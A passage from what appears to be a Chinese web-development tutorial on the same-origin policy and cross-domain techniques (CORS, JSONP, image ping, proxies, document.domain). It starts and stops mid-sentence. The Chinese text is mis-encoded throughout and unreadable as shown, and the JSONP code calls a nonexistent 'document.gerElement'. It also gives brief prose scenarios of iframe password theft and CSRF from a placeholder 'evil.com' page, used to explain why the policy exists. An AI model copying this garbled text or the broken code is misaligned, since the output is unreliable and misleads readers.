ä¹‹é—´å¯ä»¥ç›¸äº’è®¿é—®ï¼Œé‚£ä¹ˆé»‘å®¢å¯ä»¥è¿™æ ·è¿›è¡Œæ”»å‡»ï¼š</strong></p><blockquote><ol><li>åšä¸€ä¸ªå‡ç½‘ç«™ï¼Œé‡Œé¢ç”¨ iframe åµŒå¥—ä¸€ä¸ªé“¶è¡Œç½‘ç«™ <code>http://mybank.com</code>ã€‚</li><li>æŠŠ iframe å®½é«˜å•¥çš„è°ƒæ•´åˆ°é¡µé¢å…¨éƒ¨ï¼Œè¿™æ ·ç”¨æˆ·è¿›æ¥é™¤äº†åŸŸåï¼Œåˆ«çš„éƒ¨åˆ†å’Œé“¶è¡Œçš„ç½‘ç«™æ²¡æœ‰ä»»ä½•å·®åˆ«ã€‚</li><li>è¿™æ—¶å¦‚æœç”¨æˆ·è¾“å…¥è´¦å·å¯†ç ï¼Œæˆ‘ä»¬çš„ä¸»ç½‘ç«™å¯ä»¥è·¨åŸŸè®¿é—®åˆ° <code>http://mybank.com</code> çš„ dom èŠ‚ç‚¹ï¼Œå°±å¯ä»¥æ‹¿åˆ°ç”¨æˆ·çš„è´¦æˆ·å¯†ç äº†ã€‚</li></ol></blockquote><p><strong>å¦‚æœæ²¡æœ‰ XMLHttpRequest åŒæºç­–ç•¥ï¼Œé‚£ä¹ˆé»‘å®¢å¯ä»¥è¿›è¡Œ CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ æ”»å‡»ï¼š</strong></p><blockquote><ol><li>ç”¨æˆ·ç™»å½•äº†è‡ªå·±çš„é“¶è¡Œé¡µé¢ <code>http://mybank.com</code>ï¼Œ<code>http://mybank.com</code> å‘ç”¨æˆ·çš„ cookie ä¸­æ·»åŠ ç”¨æˆ·æ ‡è¯†ã€‚</li><li>ç”¨æˆ·æµè§ˆäº†æ¶æ„é¡µé¢ <code>http://evil.com</code>ï¼Œæ‰§è¡Œäº†é¡µé¢ä¸­çš„æ¶æ„ AJAX è¯·æ±‚ä»£ç ã€‚</li><li><code>http://evil.com</code> å‘ <code>http://mybank.com</code> å‘èµ· AJAX HTTP è¯·æ±‚ï¼Œè¯·æ±‚ä¼šé»˜è®¤æŠŠ <code>http://mybank.com</code> å¯¹åº” cookie ä¹ŸåŒæ—¶å‘é€è¿‡å»ã€‚</li><li>é“¶è¡Œé¡µé¢ä»å‘é€çš„ cookie ä¸­æå–ç”¨æˆ·æ ‡è¯†ï¼ŒéªŒè¯ç”¨æˆ·æ— è¯¯ï¼Œresponse ä¸­è¿”å›è¯·æ±‚æ•°æ®ã€‚æ­¤æ—¶æ•°æ®å°±æ³„éœ²äº†ã€‚</li><li>è€Œä¸”ç”±äº Ajax åœ¨åå°æ‰§è¡Œï¼Œç”¨æˆ·æ— æ³•æ„ŸçŸ¥è¿™ä¸€è¿‡ç¨‹ã€‚</li></ol></blockquote><p>å› æ­¤ï¼Œæœ‰äº†æµè§ˆå™¨åŒæºç­–ç•¥ï¼Œæˆ‘ä»¬æ‰èƒ½æ›´å®‰å…¨çš„ä¸Šç½‘ã€‚</p><h2 id="è·¨åŸŸçš„è§£å†³æ–¹æ³•"><a href="#è·¨åŸŸçš„è§£å†³æ–¹æ³•" class="headerlink" title="è·¨åŸŸçš„è§£å†³æ–¹æ³•"></a>è·¨åŸŸçš„è§£å†³æ–¹æ³•</h2><p>ä»ä¸Šé¢æˆ‘ä»¬äº†è§£åˆ°äº†æµè§ˆå™¨åŒæºç­–ç•¥çš„ä½œç”¨ï¼Œä¹Ÿæ­£æ˜¯æœ‰äº†è·¨åŸŸé™åˆ¶ï¼Œæ‰ä½¿æˆ‘ä»¬èƒ½å®‰å…¨çš„ä¸Šç½‘ã€‚ä½†æ˜¯åœ¨å®é™…ä¸­ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦çªç ´è¿™æ ·çš„é™åˆ¶ï¼Œå› æ­¤ä¸‹é¢å°†ä»‹ç»å‡ ç§è·¨åŸŸçš„è§£å†³æ–¹æ³•ã€‚</p><h2 id="CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰"><a href="#CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰" class="headerlink" title="CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰"></a>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰</h2><blockquote><p>CORSï¼ˆCross-origin resource sharingï¼Œè·¨åŸŸèµ„æºå…±äº«ï¼‰æ˜¯ä¸€ä¸ª W3C æ ‡å‡†ï¼Œå®šä¹‰äº†åœ¨å¿…é¡»è®¿é—®è·¨åŸŸèµ„æºæ—¶ï¼Œæµè§ˆå™¨ä¸æœåŠ¡å™¨åº”è¯¥å¦‚ä½•æ²Ÿé€šã€‚CORS èƒŒåçš„åŸºæœ¬æ€æƒ³ï¼Œå°±æ˜¯ä½¿ç”¨è‡ªå®šä¹‰çš„ HTTP å¤´éƒ¨è®©æµè§ˆå™¨ä¸æœåŠ¡å™¨è¿›è¡Œæ²Ÿé€šï¼Œä»è€Œå†³å®šè¯·æ±‚æˆ–å“åº”æ˜¯åº”è¯¥æˆåŠŸï¼Œè¿˜æ˜¯åº”è¯¥å¤±è´¥ã€‚</p><p>CORS éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åŒæ—¶æ”¯æŒã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ï¼ŒIE æµè§ˆå™¨ä¸èƒ½ä½äº IE10ã€‚</p><p>æ•´ä¸ª CORS é€šä¿¡è¿‡ç¨‹ï¼Œéƒ½æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆï¼Œä¸éœ€è¦ç”¨æˆ·å‚ä¸ã€‚å¯¹äºå¼€å‘è€…æ¥è¯´ï¼ŒCORS é€šä¿¡ä¸åŒæºçš„ AJAX é€šä¿¡æ²¡æœ‰å·®åˆ«ï¼Œä»£ç å®Œå…¨ä¸€æ ·ã€‚æµè§ˆå™¨ä¸€æ—¦å‘ç° AJAX è¯·æ±‚è·¨æºï¼Œå°±ä¼šè‡ªåŠ¨æ·»åŠ ä¸€äº›é™„åŠ çš„å¤´ä¿¡æ¯ï¼Œæœ‰æ—¶è¿˜ä¼šå¤šå‡ºä¸€æ¬¡é™„åŠ çš„è¯·æ±‚ï¼Œä½†ç”¨æˆ·ä¸ä¼šæœ‰æ„Ÿè§‰ã€‚</p><p>å› æ­¤ï¼Œå®ç° CORS é€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨ã€‚åªè¦æœåŠ¡å™¨å®ç°äº† CORS æ¥å£ï¼Œå°±å¯ä»¥è·¨æºé€šä¿¡ã€‚</p><p>æµè§ˆå™¨å°†CORSè¯·æ±‚åˆ†æˆä¸¤ç±»ï¼š<code>ç®€å•è¯·æ±‚ï¼ˆsimple request</code>ï¼‰å’Œ<code>éç®€å•è¯·æ±‚ï¼ˆnot-so-simple request</code>ï¼‰ã€‚</p></blockquote><p>åªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤å¤§æ¡ä»¶ï¼Œå°±å±äº<strong>ç®€å•è¯·æ±‚</strong>ã€‚</p><blockquote><p>1.è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ï¼š</p><ul><li>HEAD</li><li>GET</li><li>POST</li></ul><p>2.HTTPçš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µï¼š</p><ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Last-Event-ID</li><li>Content-Typeï¼šåªé™äºä¸‰ä¸ªå€¼ application&#x2F;x-www-form-urlencodedã€multipart&#x2F;form-dataã€text&#x2F;plain</li></ul></blockquote><p>å‡¡æ˜¯ä¸åŒæ—¶æ»¡è¶³ä¸Šé¢ä¸¤ä¸ªæ¡ä»¶ï¼Œå°±å±äº<strong>éç®€å•è¯·æ±‚</strong>ã€‚</p><p>æµè§ˆå™¨å¯¹è¿™ä¸¤ç§è¯·æ±‚çš„å¤„ç†ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚</p><h3 id="ç®€å•è¯·æ±‚"><a href="#ç®€å•è¯·æ±‚" class="headerlink" title="ç®€å•è¯·æ±‚"></a>ç®€å•è¯·æ±‚</h3><blockquote><ol><li>åœ¨è¯·æ±‚ä¸­éœ€è¦é™„åŠ ä¸€ä¸ªé¢å¤–çš„ Origin å¤´éƒ¨ï¼Œå…¶ä¸­åŒ…å«è¯·æ±‚é¡µé¢çš„æºä¿¡æ¯ï¼ˆåè®®ã€åŸŸåå’Œç«¯å£ï¼‰ï¼Œä»¥ä¾¿æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªå¤´éƒ¨ä¿¡æ¯æ¥å†³å®šæ˜¯å¦ç»™äºˆå“åº”ã€‚ä¾‹å¦‚ï¼š<code>Origin: http://www.laixiangran.cn</code></li><li>å¦‚æœæœåŠ¡å™¨è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å¯ä»¥æ¥å—ï¼Œå°±åœ¨ Access-Control-Allow-Origin å¤´éƒ¨ä¸­å›å‘ç›¸åŒçš„æºä¿¡æ¯ï¼ˆå¦‚æœæ˜¯å…¬å…±èµ„æºï¼Œå¯ä»¥å›å‘ * ï¼‰ã€‚ä¾‹å¦‚ï¼š<code>Access-Control-Allow-Originï¼šhttp://www.laixiangran.cn</code></li><li>æ²¡æœ‰è¿™ä¸ªå¤´éƒ¨æˆ–è€…æœ‰è¿™ä¸ªå¤´éƒ¨ä½†æºä¿¡æ¯ä¸åŒ¹é…ï¼Œæµè§ˆå™¨å°±ä¼šé©³å›è¯·æ±‚ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šå¤„ç†è¯·æ±‚ã€‚æ³¨æ„ï¼Œè¯·æ±‚å’Œå“åº”éƒ½ä¸åŒ…å« cookie ä¿¡æ¯ã€‚</li><li>å¦‚æœéœ€è¦åŒ…å« cookie ä¿¡æ¯ï¼Œajax è¯·æ±‚éœ€è¦è®¾ç½® xhr çš„å±æ€§ withCredentials ä¸º trueï¼ŒæœåŠ¡å™¨éœ€è¦è®¾ç½®å“åº”å¤´éƒ¨ <code>Access-Control-Allow-Credentials: true</code>ã€‚</li></ol></blockquote><h3 id="éç®€å•è¯·æ±‚"><a href="#éç®€å•è¯·æ±‚" class="headerlink" title="éç®€å•è¯·æ±‚"></a>éç®€å•è¯·æ±‚</h3><p>æµè§ˆå™¨åœ¨å‘é€çœŸæ­£çš„è¯·æ±‚ä¹‹å‰ï¼Œä¼šå…ˆå‘é€ä¸€ä¸ª Preflight è¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œè¿™ç§è¯·æ±‚ä½¿ç”¨ OPTIONS æ–¹æ³•ï¼Œå‘é€ä¸‹åˆ—å¤´éƒ¨ï¼š</p><blockquote><ul><li>Originï¼šä¸ç®€å•çš„è¯·æ±‚ç›¸åŒã€‚</li><li>Access-Control-Request-Method: è¯·æ±‚è‡ªèº«ä½¿ç”¨çš„æ–¹æ³•ã€‚</li><li>Access-Control-Request-Headers: ï¼ˆå¯é€‰ï¼‰è‡ªå®šä¹‰çš„å¤´éƒ¨ä¿¡æ¯ï¼Œå¤šä¸ªå¤´éƒ¨ä»¥é€—å·åˆ†éš”ã€‚</li></ul></blockquote><p>ä¾‹å¦‚ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">Origin: http://www.laixiangran.cn</span></span><br><span class="line"><span class="section">Access-Control-Request-Method: POST</span></span><br><span class="line"><span class="section">Access-Control-Request-Headers: NCZ</span></span><br></pre></td></tr></table></figure><p>å‘é€è¿™ä¸ªè¯·æ±‚åï¼ŒæœåŠ¡å™¨å¯ä»¥å†³å®šæ˜¯å¦å…è®¸è¿™ç§ç±»å‹çš„è¯·æ±‚ã€‚æœåŠ¡å™¨é€šè¿‡åœ¨å“åº”ä¸­å‘é€å¦‚ä¸‹å¤´éƒ¨ä¸æµè§ˆå™¨è¿›è¡Œæ²Ÿé€šï¼š</p><blockquote><ul><li>Access-Control-Allow-Originï¼šä¸ç®€å•çš„è¯·æ±‚ç›¸åŒã€‚</li><li>Access-Control-Allow-Methods: å…è®¸çš„æ–¹æ³•ï¼Œå¤šä¸ªæ–¹æ³•ä»¥é€—å·åˆ†éš”ã€‚</li><li>Access-Control-Allow-Headers: å…è®¸çš„å¤´éƒ¨ï¼Œå¤šä¸ªæ–¹æ³•ä»¥é€—å·åˆ†éš”ã€‚</li><li>Access-Control-Max-Age: åº”è¯¥å°†è¿™ä¸ª Preflight è¯·æ±‚ç¼“å­˜å¤šé•¿æ—¶é—´ï¼ˆä»¥ç§’è¡¨ç¤ºï¼‰ã€‚</li></ul></blockquote><p>ä¾‹å¦‚ï¼š</p><blockquote><p>Access-Control-Allow-Origin: <a href="http://www.laixiangran.cn/">http://www.laixiangran.cn</a><br>Access-Control-Allow-Methods: GET, POST<br>Access-Control-Allow-Headers: NCZ<br>Access-Control-Max-Age: 1728000</p></blockquote><p>ä¸€æ—¦æœåŠ¡å™¨é€šè¿‡ Preflight è¯·æ±‚å…è®¸è¯¥è¯·æ±‚ä¹‹åï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨æ­£å¸¸çš„ CORS è¯·æ±‚ï¼Œå°±éƒ½è·Ÿç®€å•è¯·æ±‚ä¸€æ ·äº†ã€‚</p><h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><blockquote><ul><li>CORS é€šä¿¡ä¸åŒæºçš„ AJAX é€šä¿¡æ²¡æœ‰å·®åˆ«ï¼Œä»£ç å®Œå…¨ä¸€æ ·ï¼Œå®¹æ˜“ç»´æŠ¤ã€‚</li><li>æ”¯æŒæ‰€æœ‰ç±»å‹çš„ HTTP è¯·æ±‚ã€‚</li></ul></blockquote><h3 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h3><blockquote><ul><li>å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯ IE10 ä»¥ä¸‹çš„æµè§ˆå™¨ã€‚</li><li>ç¬¬ä¸€æ¬¡å‘é€éç®€å•è¯·æ±‚æ—¶ä¼šå¤šä¸€æ¬¡è¯·æ±‚ã€‚</li></ul></blockquote><h2 id="JSONP-è·¨åŸŸ"><a href="#JSONP-è·¨åŸŸ" class="headerlink" title="JSONP è·¨åŸŸ"></a>JSONP è·¨åŸŸ</h2><blockquote><p>ç”±äº <code>script</code> æ ‡ç­¾ä¸å—æµè§ˆå™¨åŒæºç­–ç•¥çš„å½±å“ï¼Œå…è®¸è·¨åŸŸå¼•ç”¨èµ„æºã€‚å› æ­¤å¯ä»¥é€šè¿‡åŠ¨æ€åˆ›å»º script æ ‡ç­¾ï¼Œç„¶ååˆ©ç”¨ src å±æ€§è¿›è¡Œè·¨åŸŸï¼Œè¿™ä¹Ÿå°±æ˜¯ JSONP è·¨åŸŸçš„åŸºæœ¬åŸç†ã€‚</p></blockquote><p>ç›´æ¥é€šè¿‡ä¸‹é¢çš„ä¾‹å­æ¥è¯´æ˜ JSONP å®ç°è·¨åŸŸçš„æµç¨‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 1. å®šä¹‰ä¸€ä¸ª å›è°ƒå‡½æ•° handleResponse ç”¨æ¥æ¥æ”¶è¿”å›çš„æ•°æ®</span><br><span class="line">function handleResponse(data) &#123;</span><br><span class="line">    console.log(data)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 2. åŠ¨æ€åˆ›å»ºä¸€ä¸ª script æ ‡ç­¾ï¼Œå¹¶ä¸”å‘Šè¯‰åç«¯å›è°ƒå‡½æ•°åå« handleResponse</span><br><span class="line">var <span class="attr">body</span> = document.getElementsByTagName(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">var <span class="attr">script</span> = document.gerElement(<span class="string">&#x27;script&#x27;</span>)<span class="comment">;</span></span><br><span class="line"><span class="attr">script.src</span> = <span class="string">&#x27;http://www.laixiangran.cn/json?callback=handleResponse&#x27;</span><span class="comment">;</span></span><br><span class="line">body.appendChild(script)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 3. é€šè¿‡ script.src è¯·æ±‚ `http://www.laixiangran.cn/json?<span class="attr">callback</span>=handleResponse`ï¼Œ</span><br><span class="line">// 4. åç«¯èƒ½å¤Ÿè¯†åˆ«è¿™æ ·çš„ URL æ ¼å¼å¹¶å¤„ç†è¯¥è¯·æ±‚ï¼Œç„¶åè¿”å› handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) ç»™æµè§ˆå™¨</span><br><span class="line">// 5. æµè§ˆå™¨åœ¨æ¥æ”¶åˆ° handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) ä¹‹åç«‹å³æ‰§è¡Œ ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œ handleResponse æ–¹æ³•ï¼Œè·å¾—åç«¯è¿”å›çš„æ•°æ®ï¼Œè¿™æ ·å°±å®Œæˆä¸€æ¬¡è·¨åŸŸè¯·æ±‚äº†ã€‚</span><br></pre></td></tr></table></figure><h3 id="ä¼˜ç‚¹-1"><a href="#ä¼˜ç‚¹-1" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><blockquote><ul><li>ä½¿ç”¨ç®€ä¾¿ï¼Œæ²¡æœ‰å…¼å®¹æ€§é—®é¢˜ï¼Œç›®å‰æœ€æµè¡Œçš„ä¸€ç§è·¨åŸŸæ–¹æ³•ã€‚</li></ul></blockquote><h3 id="ç¼ºç‚¹-1"><a href="#ç¼ºç‚¹-1" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h3><blockquote><ul><li>åªæ”¯æŒ GET è¯·æ±‚ã€‚</li><li>ç”±äºæ˜¯ä»å…¶å®ƒåŸŸä¸­åŠ è½½ä»£ç æ‰§è¡Œï¼Œå› æ­¤å¦‚æœå…¶ä»–åŸŸä¸å®‰å…¨ï¼Œå¾ˆå¯èƒ½ä¼šåœ¨å“åº”ä¸­å¤¹å¸¦ä¸€äº›æ¶æ„ä»£ç ã€‚</li><li>è¦ç¡®å®š JSONP è¯·æ±‚æ˜¯å¦å¤±è´¥å¹¶ä¸å®¹æ˜“ã€‚è™½ç„¶ HTML5 ç»™ script æ ‡ç­¾æ–°å¢äº†ä¸€ä¸ª onerror äº‹ä»¶å¤„ç†ç¨‹åºï¼Œä½†æ˜¯å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ã€‚</li></ul></blockquote><h2 id="å›¾åƒ-Ping-è·¨åŸŸ"><a href="#å›¾åƒ-Ping-è·¨åŸŸ" class="headerlink" title="å›¾åƒ Ping è·¨åŸŸ"></a>å›¾åƒ Ping è·¨åŸŸ</h2><blockquote><p>ç”±äº <code>img</code> æ ‡ç­¾ä¸å—æµè§ˆå™¨åŒæºç­–ç•¥çš„å½±å“ï¼Œå…è®¸è·¨åŸŸå¼•ç”¨èµ„æºã€‚</p><p>å› æ­¤å¯ä»¥é€šè¿‡ img æ ‡ç­¾çš„ src å±æ€§è¿›è¡Œè·¨åŸŸï¼Œè¿™ä¹Ÿå°±æ˜¯å›¾åƒ Ping è·¨åŸŸçš„åŸºæœ¬åŸç†ã€‚</p></blockquote><p>ç›´æ¥é€šè¿‡ä¸‹é¢çš„ä¾‹å­æ¥è¯´æ˜å›¾åƒ Ping å®ç°è·¨åŸŸçš„æµç¨‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var <span class="attr">img</span> = new Image()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// é€šè¿‡ onload åŠ onerror äº‹ä»¶å¯ä»¥çŸ¥é“å“åº”æ˜¯ä»€ä¹ˆæ—¶å€™æ¥æ”¶åˆ°çš„ï¼Œä½†æ˜¯ä¸èƒ½è·å–å“åº”æ–‡æœ¬</span><br><span class="line"><span class="attr">img.onload</span> = img.<span class="literal">on</span>error = function() &#123;</span><br><span class="line">    console.log(&quot;Done!&quot;)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// è¯·æ±‚æ•°æ®é€šè¿‡æŸ¥è¯¢å­—ç¬¦ä¸²å½¢å¼å‘é€</span><br><span class="line"><span class="attr">img.src</span> = <span class="string">&#x27;http://www.laixiangran.cn/test?name=laixiangran&#x27;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="ä¼˜ç‚¹-2"><a href="#ä¼˜ç‚¹-2" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><blockquote><ul><li>ç”¨äºå®ç°è·Ÿè¸ªç”¨æˆ·ç‚¹å‡»é¡µé¢æˆ–åŠ¨æ€å¹¿å‘Šæ›å…‰æ¬¡æ•°æœ‰è¾ƒå¤§çš„ä¼˜åŠ¿ã€‚</li></ul></blockquote><h3 id="ç¼ºç‚¹-2"><a href="#ç¼ºç‚¹-2" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h3><blockquote><ul><li>åªæ”¯æŒ GET è¯·æ±‚ã€‚</li><li>åªèƒ½æµè§ˆå™¨ä¸æœåŠ¡å™¨çš„å•å‘é€šä¿¡ï¼Œå› ä¸ºæµè§ˆå™¨ä¸èƒ½è®¿é—®æœåŠ¡å™¨çš„å“åº”æ–‡æœ¬ã€‚</li></ul></blockquote><h2 id="æœåŠ¡å™¨ä»£ç†"><a href="#æœåŠ¡å™¨ä»£ç†" class="headerlink" title="æœåŠ¡å™¨ä»£ç†"></a>æœåŠ¡å™¨ä»£ç†</h2><blockquote><p>æµè§ˆå™¨æœ‰è·¨åŸŸé™åˆ¶ï¼Œä½†æ˜¯æœåŠ¡å™¨ä¸å­˜åœ¨è·¨åŸŸé—®é¢˜ï¼Œæ‰€ä»¥å¯ä»¥ç”±æœåŠ¡å™¨è¯·æ±‚æ‰€æœ‰åŸŸçš„èµ„æºå†è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><p>**<u>æœåŠ¡å™¨ä»£ç†æ˜¯ä¸‡èƒ½çš„</u>**ã€‚</p></blockquote><h2 id="document-domain-è·¨åŸŸ"><a href="#document-domain-è·¨åŸŸ" class="headerlink" title="document.domain è·¨åŸŸ"></a>document.domain è·¨åŸŸ</h2><blockquote><p>å¯¹äºä¸»åŸŸåç›¸åŒï¼Œè€Œå­åŸŸåä¸åŒçš„æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ document.domain æ¥è·¨åŸŸã€‚è¿™ç§æ–¹å¼éå¸¸é€‚ç”¨äº iframe è·¨åŸŸçš„æƒ…å†µã€‚</p></blockquote><p>æ¯”å¦‚ï¼Œ</p><p>æœ‰ä¸€ä¸ªé¡µé¢ï¼Œå®ƒçš„åœ°å€æ˜¯ <code>http://www.laixiangran.cn/a.html</code>ï¼Œåœ¨è¿™ä¸ªé¡µé¢é‡Œé¢æœ‰ä¸€ä¸ª iframeï¼Œå®ƒçš„ src æ˜¯ <code>http://laixiangran.cn/b.html</code>ã€‚</p><blockquote><p>å¾ˆæ˜¾ç„¶ï¼Œè¿™ä¸ªé¡µé¢ä¸å®ƒé‡Œé¢çš„ iframe æ¡†æ¶æ˜¯ä¸åŒåŸŸçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯æ— æ³•é€šè¿‡åœ¨é¡µé¢ä¸­ä¹¦å†™ js ä»£ç æ¥è·å– iframe ä¸­çš„ä¸œè¥¿çš„ã€‚</p><p>è¿™ä¸ªæ—¶å€™ï¼Œdocument.domain å°±å¯ä»¥æ´¾ä¸Šç”¨åœºäº†ï¼Œæˆ‘ä»¬åªè¦æŠŠ <code>http://www.laixiangran.cn/a.html</code> å’Œ <code>http://laixiangran.cn/b.html</code> è¿™ä¸¤ä¸ªé¡µé¢çš„ document.domain éƒ½è®¾æˆç›¸åŒçš„åŸŸåå°±å¯ä»¥äº†ã€‚ä½†è¦æ³¨æ„çš„æ˜¯ï¼Œdocument.domain çš„è®¾ç½®æ˜¯æœ‰é™åˆ¶çš„ï¼Œæˆ‘ä»¬åªèƒ½æŠŠ document.domain è®¾ç½®æˆè‡ªèº«æˆ–æ›´é«˜ä¸€çº§çš„çˆ¶åŸŸï¼Œä¸”ä¸»åŸŸå¿…é¡»ç›¸åŒã€‚ä¾‹å¦‚ï¼š<code>a.b.laixiangran.cn</code> ä¸­æŸä¸ªæ–‡æ¡£çš„ document.domain å¯ä»¥è®¾æˆ <code>a.b.laixiangran.cn</code>ã€<code>b.laixiangran.cn</code> ã€<code>laixiangran.cn</code> ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œä½†æ˜¯ä¸å¯ä»¥è®¾æˆ <code>c.a.b.laixiangran.cn</code> ï¼Œå› ä¸ºè¿™æ˜¯å½“å‰åŸŸçš„å­åŸŸï¼Œä¹Ÿä¸å¯ä»¥è®¾æˆ <code>baidu.com</code>ï¼Œå› ä¸ºä¸»åŸŸå·²ç»ä¸ç›¸åŒäº†ã€‚</p></blockquote><p>ä¾‹å¦‚ï¼Œåœ¨é¡µé¢ <code>http://www.laixiangran.cn/a.html</code> ä¸­è®¾ç½®document.domainï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;laixiangran.cn&#x27;</span>; <span class="comment">// è®¾ç½®æˆä¸»åŸŸ</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>).<span class="property">contentWindow</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨é¡µé¢ <code>http://laixiangran.cn/b.html</code> ä¸­ä¹Ÿè®¾ç½® document.domainï¼Œè€Œä¸”è¿™ä¹Ÿæ˜¯å¿…é¡»çš„ï¼Œè™½ç„¶è¿™ä¸ªæ–‡æ¡£çš„ domain å°±æ˜¯ <code>laixiangran.cn</code>ï¼Œä½†æ˜¯è¿˜æ˜¯å¿…é¡»æ˜¾å¼åœ°è®¾ç½® document.domain çš„å€¼ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;laixiangran.cn&#x27;</span>; <span class="comment">// document.domain è®¾ç½®æˆä¸ä¸»é¡µé¢ç›¸åŒ</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œ<code>http://www.laixiangran.cn/a.html</code> å°±å¯ä»¥é€šè¿‡ js è®¿é—®åˆ° <code>http://laixiangran.cn/b.html</code> ä¸­çš„å„ç§å±æ€§å’Œå¯¹è±¡äº†ã€‚</p><h2 id="window-name-è·¨åŸŸ"><a href="#window-name-è·¨åŸŸ" class="headerlink" title="window.name è·¨åŸŸ"></a><a href="https://link.juejin.cn/?target=http://window.name">window.name</a> è·¨åŸŸ</h2><blockquote><p>window å¯¹è±¡æœ‰ä¸ª name 